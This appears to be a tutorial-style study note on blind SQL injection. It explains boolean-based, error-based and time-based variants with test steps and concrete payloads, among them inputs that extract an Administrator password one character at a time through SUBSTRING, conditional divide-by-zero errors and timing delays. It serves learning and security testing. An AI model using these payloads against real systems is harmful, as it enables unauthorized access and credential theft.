# Blind SQL Injection:

## D. Blind SQL injection, `where the results of a query you can't see in the application's HTTP responses.`
- Basically, the attacker doesn't see the direct results of their injected queries rather the attacker relies on the behavior of the site.
- Trial and error, the attacker continues to extract data by asking a series of true or false questions, gradually revealing sensitive information such as database structure, table names, or even specific data records.

# Type 1: Boolean-Based Blind SQL Injection
- Test Steps:
1. Enter a legitimate username and password in the login form.
2. In the username field, append a single quote (`'`) and `AND 1=1--` to inject a condition that is always true.
3. Observe the application's response.

- Expected Outcome: The login should be successful, indicating a vulnerability to boolean-based blind SQL injection.

## Exploiting blind SQL injection by triggering conditional responses:
- Inject the SQLi to affect the Application Logic i.e WHERE condition.
- The LIMIT (MySQL and PostgreSQL) or TOP(T-SQL) clause ensures that the query returns only one row.
- Cookies, while useful for maintaining state and enhancing user experience on the web.

- ![image](https://github.com/user-attachments/assets/fac6eae1-c2b4-479f-a395-ff2cd0c8dcdf)

### Example:
```sql
…xyz' AND '1'='1     The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
…xyz' AND '1'='2     The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
```

- For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
```sql
To do this, start with the following input:

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

Next, we send the following input:
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
We can continue this process to systematically determine the full password for the Administrator user.
```

_Example_
```sql
Injected Payload:
Suppose the application constructs a query like this: SELECT * FROM items WHERE item_name = 'input_value'.
An attacker could input anything' OR (SELECT 'a' FROM users LIMIT 1)='a' --.
This could result in the following SQL query: SELECT * FROM items WHERE item_name = 'anything' OR (SELECT 'a' FROM users LIMIT 1)='a' --'.

Result:
If the users table has rows, (SELECT 'a' FROM users LIMIT 1)='a' evaluates to TRUE.
Therefore, the entire WHERE clause evaluates to TRUE, potentially bypassing the intended query logic and returning all rows from the items table.
```

# Type 2: Error-Based Blind SQL Injection
- Refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts
- may be able to induce the application to return a specific error response based on the result of a boolean expression.
- may be able to trigger error messages that output the data returned by the query.

- Test Steps:
1. Enter a legitimate username and password in the login form.
2. In the username field, append a single quote (`'`) and `AND 1=0 UNION SELECT 1/0--` to generate an SQL error by dividing by zero.
3. Observe the application's response.

- Expected Outcome: The application should display an error message, indicating a vulnerability to error-based blind SQL injection.

## Exploiting blind SQL injection by triggering conditional errors:
- To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:

With the first input, the CASE expression evaluates to 'a', which does not cause any error.
With the second input, it evaluates to 1/0, which causes a divide-by-zero error.
```

- If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
- Injection: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

## Extracting sensitive data via verbose SQL error messages:
- Misconfiguration of the database sometimes results in verbose error messages.
- Error Message: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
- To induce the application to generate an error message that contains some of the data that is returned by the query.
- You can use the CAST() function to achieve this. It enables you to convert one data type to another.

# Type 3: Time-Based Blind SQL Injection
- Test Steps:
1. Enter a legitimate username and password in the login form.
2. In the username field, append injection `'AND SLEEP(5)--` to introduce a delay of 5 seconds in the query execution.
3. Observe the application's response.

- Expected Outcome: The login process should exhibit a noticeable delay, indicating a vulnerability to time-based blind SQL injection.

## Exploiting blind SQL injection by triggering time delays:
- SQL queries are normally processed synchronously by the application, `delaying the execution of a SQL query also delays the HTTP response.`
```mssql
For Microsoft SQL Server,:

'; IF (1=2) WAITFOR DELAY '0:0:10'-- # The first of these inputs does not trigger a delay, because the condition 1=2 is false.
'; IF (1=1) WAITFOR DELAY '0:0:10'-- # The second input triggers a delay of 10 seconds, because the condition 1=1 is true.
```
- Injection: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
